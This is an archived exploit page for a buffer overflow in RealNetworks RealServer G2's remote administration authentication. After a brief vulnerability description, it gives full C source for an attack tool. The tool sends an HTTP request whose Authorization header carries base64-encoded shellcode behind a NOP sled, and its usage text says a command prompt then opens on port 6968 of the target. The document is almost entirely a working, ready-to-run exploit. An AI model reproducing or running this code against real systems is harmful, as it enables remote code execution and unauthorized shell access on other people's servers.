source: http://www.securityfocus.com/bid/767/info
 
At installation, the Real Server software randomly selects an unused port as the remote administration port. This port is used by Real Server's remote web administration feature. To access this feature, the correct port must be specified and a valid username/password pair must be entered. By sending a long response to this authentication request, the buffer can be overwritten and arbitrary code can be executed on the server.

/* RealNetworks RealServer G2 buffer overflow exploit

 *

 * by dark spyrit <dspyrit@beavuh.org>

 * quick unix port by team teso

 *

 * the windows binary is available at http://www.beavuh.org.

 *

 * This exploits a buffer overflow in RealServers web authentication on

 * the administrator port - hence the reason the shellcode is base64 encoded.

 * This has been tested on the NT version with a default installation.

 * If RealServer is installed in a different directory than the default, the

 * buffer will need to be adjusted accordingly.

 * The administrator port is randomly selected at installation, but as you'll

 * only be testing on your own networks this won't matter :)

 */



#include <sys/types.h>

#include <sys/time.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <arpa/inet.h>

#include <unistd.h>

#include <errno.h>

#include <stdlib.h>

#include <stdio.h>

#include <string.h>

#include <fcntl.h>

#include <netdb.h>





/* local functions

 */

unsigned long int       net_resolve (char *host);

int                     net_connect (struct sockaddr_in *cs, char *server,

        unsigned short int port, int sec);



unsigned char   sploit[] =

        "GET /admin/index.html HTTP/1.0\x0d\x0a"

        "Connection: Keep-Alive\x0d\x0a"

        "User-Agent: Mozilla/4.04 [en] (X11; I; Beavuh OS .9 i486; Nav)\x0d\x0a"

        "Host: 111.111.11.1:1111\x0d\x0a"

        "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\x0d\x0a"

        "Accept-Language: en\x0d\x0a"

        "Accept-Charset: iso-8859-1,*,utf-8\x0d\x0a"

        "Authorization: Basic kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

        "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk"

        "JCQkJCQkJCQkJCQkJCQkJCQ6wiQkJBXRToAkJCQkJCQkJCQkJCQkJCQkIt0JPiL/jPAUPf"

        "QUFnyr1mxxovHSIAwmeL6M/aWu5mcQEbB6whW/xOL0PwzybELSTLArITAdflSUVZSs5T/E"

        "6tZWuLsMsCshMB1+bOcVv8Ti9D8M8mxBjLArITAdflSUVZSs5T/E6tZWuLsg8YFM8BQQFB"

        "AUP9X6JNqEFZT/1fsagJT/1fwM8BXULAMq1irQKtfSFBXVq1W/1fASFBXrVatVv9XwEiwR"

        "IkHV/9XxDPAi0b0iUc8iUdAiwaJRzgzwGa4AQGJRyxXVzPAUFBQQFBIUFCtVjPAUP9XyP9"

        "28P9XzP92/P9XzEhQUFP/V/SL2DPAtARQwegEUP9X1IvwM8CLyLUEUFBXUVD/d6j/V9CDP"

        "wF8IjPAUFf/N1b/d6j/V9wLwHQvM8BQ/zdWU/9X+GpQ/1fg68gzwFC0BFBWU/9X/FczyVF"

        "QVv93rP9X2GpQ/1fg66pQ/1fkkNLcy9fc1aqrmdrr/Pjt/Mnw6fyZ3vztyu346+3s6dD3/"

        "/bYmdrr/Pjt/Mnr9vr86urYmdr19ur80fj3/fX8mcn8/PLX+PT8/cnw6fyZ3vX2+/j12PX"

        "19vqZzuvw7fzf8PX8mcv8+P3f8PX8mcr1/Pzpmdzh8O3J6/b6/Orqmc7K1trSqquZ6vb68"

        "vztmfvw9/2Z9fDq7fz3mfj6+vzp7Znq/Pf9mev8+u+Zm5mCoZmZmZmZmZmZmZmZmfr0/bf"

        "84fyZ/////w==\x0d\x0a\x0d\x0a\x00";





int

main (int argc, char **argv)

{

        int                     socket;

        char                    *server;

        unsigned short int      port;

        struct sockaddr_in      sa;



        if (argc != 3) {

                printf ("RealServer G2 exploit [NT] - please check http://www.beavuh.org for info.\n"

                        "by dark spyrit <dspyrit@beavuh.org>, port by team teso\n\n"

                        "usage: %s <host> <admin_port>\n"

                        "eg - %s host.com 6666\n"

                        "the exploit will spawn a command prompt on port 6968\n\n", argv[0], argv[0]);



                exit (EXIT_FAILURE);

        }



        server = argv[1];

        port = atoi (argv[2]);



        socket = net_connect (&sa, server, port, 45);

        if (socket <= 0) {

                perror ("net_connect");

                exit (EXIT_FAILURE);

        }



        write (socket, sploit, strlen (sploit));

        sleep (1);

        close (socket);



        printf ("data sent. try \"telnet %s 6968\" now \n", server);



        exit (EXIT_SUCCESS);

}





unsigned long int

net_resolve (char *host)

{

        long            i;

        struct hostent  *he;



        i = inet_addr (host);

        if (i == -1) {

                he = gethostbyname (host);

                if (he == NULL) {

                        return (0);

                } else {

                        return (*(unsigned long *) he->h_addr);

                }

        }



        return (i);

}





int

net_connect (struct sockaddr_in *cs, char *server,

        unsigned short int port, int sec)

{

        int             n, len, error, flags;

        int             fd;

        struct timeval  tv;

        fd_set          rset, wset;



        /* first allocate a socket */

        cs->sin_family = AF_INET;

        cs->sin_port = htons (port);

        fd = socket (cs->sin_family, SOCK_STREAM, 0);

        if (fd == -1)

                return (-1);



        cs->sin_addr.s_addr = net_resolve (server);

        if (cs->sin_addr.s_addr == 0) {

                close (fd);

                return (-1);

        }



        flags = fcntl (fd, F_GETFL, 0);

        if (flags == -1) {

                close (fd);

                return (-1);

        }

        n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);

        if (n == -1) {

                close (fd);

                return (-1);

        }



        error = 0;



        n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));

        if (n < 0) {

                if (errno != EINPROGRESS) {

                        close (fd);

                        return (-1);

                }

        }

        if (n == 0)

                goto done;



        FD_ZERO(&rset);

        FD_ZERO(&wset);

        FD_SET(fd, &rset);

        FD_SET(fd, &wset);

        tv.tv_sec = sec;

        tv.tv_usec = 0;



        n = select(fd + 1, &rset, &wset, NULL, &tv);

        if (n == 0) {

                close(fd);

                errno = ETIMEDOUT;

                return (-1);

        }

        if (n == -1)

                return (-1);



        if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {

                if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {

                        len = sizeof(error);

                        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {

                                errno = ETIMEDOUT;

                                return (-1);

                        }

                        if (error == 0) {

                                goto done;

                        } else {

                                errno = error;

                                return (-1);

                        }

                }

        } else

                return (-1);



done:

        n = fcntl(fd, F_SETFL, flags);

        if (n == -1)

                return (-1);



        return (fd);

}
